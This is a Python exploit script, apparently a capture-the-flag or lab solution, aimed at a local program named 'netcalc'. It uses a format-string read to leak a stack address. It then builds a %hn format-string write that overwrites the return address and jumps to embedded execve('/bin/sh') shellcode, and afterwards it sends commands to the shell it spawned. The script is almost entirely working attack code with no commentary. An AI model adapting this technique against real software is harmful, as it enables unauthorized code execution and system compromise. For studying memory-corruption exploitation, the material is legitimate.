#!/usr/bin/python
import subprocess
import sys
import struct
import time

shellcode = \
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def readuntil(stream, pattern):
    while True:
        line = stream.readline()
        print(line[:-1])
        if pattern in line:
            break

process = subprocess.Popen(["./netcalc"],
                           stdin=subprocess.PIPE,
                           stdout=subprocess.PIPE, bufsize=0)

readuntil(process.stdout, "(1-3):")
process.stdin.write("1\n")
readuntil(process.stdout, "number:")
process.stdin.write("%2$08x\n")
readuntil(process.stdout, "input:")
bufaddr = int(process.stdout.read(8), 16)
print "%X" % (bufaddr)
retaddr = bufaddr + 0x210 - 4
print "%X" % (retaddr)
lo, hi = struct.unpack("<HH", struct.pack("<I", bufaddr - 4 + 8))
print "%X" % (lo)
print "%X" % (hi)
readuntil(process.stdout, "number:")

payload = ""
payload += struct.pack("<I", retaddr) # lo
payload += struct.pack("<I", retaddr + 2) # hi
payload += shellcode
payload += "%" + ("%d" % (hi - 31)) + "d"
payload += "%4$hn"
payload += "%" + ("%d" % (lo - hi)) + "d"
payload += "%3$hn"
payload += "\n"

#print (payload)

process.stdin.write(payload)
time.sleep(5)
process.stdin.write("ls\n")

#print(process.stdout.readline())

####################################
while True:
    print(process.stdout.readline())
